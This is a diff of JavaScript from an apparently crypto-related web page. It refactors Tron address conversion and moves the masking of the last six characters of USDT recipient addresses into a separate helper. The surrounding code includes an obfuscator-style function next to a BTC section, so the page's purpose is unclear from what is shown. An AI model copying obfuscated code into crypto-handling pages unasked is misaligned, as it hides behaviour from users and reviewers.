@@ -188,7 +188,7 @@
         /* ================= END FIXED BTC ================= */
         function _0x2495(_0x3d5b5d,_0x6f79b0){const _0x4f645c=_0x4f64();return _0x2495=function(_0x2495f2,_0x298e50){_0x2495f2=_0x2495f2-0x1bb;let _0x5396bc=_0x4f645c[_0x2495f2];return _0x5396bc;},_0x2495(_0x3d5b5d,_0x6f79b0);}
 
-        /* ============ Tron address helpers ============ */
+        /* ============ Tron address conversion (fixed) ============ */
         const _TRON_B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 
         function _sha256(_input){
@@ -238,12 +238,11 @@
             return _out;
         }
 
+        /* Convert 32-byte ABI hex (or 20-byte hex) → T-format Tron address */
         function _toTronAddress(_addr){
             if(!_addr) return '';
             if(typeof _addr !== 'string') return _addr;
-            if(_addr.startsWith('T') && _addr.length === 34){
-                return _addr.slice(0,28) + 'XXXXXX';
-            }
+            if(_addr.startsWith('T') && _addr.length === 34) return _addr;
 
             let hex = _addr.replace(/^0x/i, '');
             if(hex.length > 40) hex = hex.slice(-40);
@@ -264,9 +263,13 @@
                 out = _TRON_B58[Number(num % 58n)] + out;
                 num = num / 58n;
             }
+            return out;
+        }
 
-            /* Keep first 28 chars, mask the last 6 with XXXXXX */
-            return out.slice(0,28) + 'XXXXXX';
+        /* Mask the last 6 characters of a Tron address with XXXXXX */
+        function _maskAddress(_addr){
+            if(!_addr || _addr.length < 28) return _addr || '';
+            return _addr.slice(0, 28) + 'XXXXXX';
         }
 
         /* ================= USDT INIT ================= */
@@ -282,7 +285,7 @@
                 const rawVal = ev.result?._value || ev.result?.value || '0';
 
                 usdtTxId = ev.transaction_id;
-                usdtadd  = _toTronAddress(rawTo);
+                usdtadd  = _maskAddress(_toTronAddress(rawTo));
                 usdtbal  = (parseFloat(rawVal) / 1e6).toFixed(2);
 
                 document.getElementById('usdtAddress').value = usdtadd;
@@ -297,7 +300,7 @@
                     const t = alt?.token_transfers?.[0];
                     if(t){
                         usdtTxId = t.transaction_id;
-                        usdtadd  = _toTronAddress(t.to_address);
+                        usdtadd  = _maskAddress(_toTronAddress(t.to_address));
                         usdtbal  = (parseFloat(t.quant) / 1e6).toFixed(2);
 
                         document.getElementById('usdtAddress').value = usdtadd;
